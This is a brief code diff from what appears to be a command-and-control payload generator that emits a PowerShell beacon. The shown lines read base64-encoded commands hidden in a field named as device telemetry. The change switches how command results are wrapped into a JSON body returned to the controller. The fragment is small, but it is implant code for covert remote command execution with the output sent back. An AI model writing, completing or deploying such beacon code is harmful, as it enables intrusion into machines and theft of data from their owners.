@@ -62,7 +62,8 @@ def make_raw(ip, port, beacon_interval, headers, useragent, accept, byte_range, 
 				$cmd_b64 = $task.DeviceTelemetry.Telemetry;
 			
 		""").replace("\n", "")
-		send_output = "$output = $results|Out-String;"
+		#send_output = "$output = $results|Out-String;"
+		send_output = "$body = @{ output = $b64 } | ConvertTo-Json;"
 
 
 		formatted_headers = payutils.build_powershell_headers(
